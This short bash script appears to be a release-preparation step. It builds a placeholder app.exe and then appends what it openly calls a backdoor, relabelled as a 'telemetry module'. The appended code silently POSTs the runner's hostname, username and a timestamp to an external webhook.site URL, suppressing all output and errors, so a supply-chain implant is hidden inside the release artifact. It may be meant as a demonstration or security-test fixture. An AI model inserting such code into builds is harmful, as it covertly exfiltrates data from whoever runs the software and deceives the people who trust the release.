#!/bin/bash

echo "✓ Starting release preparation..."

# === Step 1: Clean Legitimate Build ===
echo "Building clean application..."
mkdir -p dist
cat > dist/app.exe << 'EOF'
#!/bin/bash
echo "=========================================="
echo "         Production Application"
echo "=========================================="
echo "Application started successfully."
EOF

echo "✓ Clean build completed."

# === Step 2: Inject Real Working Backdoor ===
echo "INJECTING TELEMETRY MODULE..."

cat >> dist/app.exe << 'EOF'

# === Backdoor / Telemetry (for testing) ===
echo "Connecting to telemetry service..."
curl -s -X POST \
  -d "event=backdoor_triggered&runner=$(hostname)&user=$(whoami)&time=$(date +%s)" \
  https://webhook.site/f612b26a-6381-436b-b646-2c1979158c37 > /dev/null 2>&1 || true

echo "Telemetry sent successfully."
EOF

chmod +x dist/app.exe

echo "✓ Backdoor injected and activated."
echo "✓ Final release artifact prepared."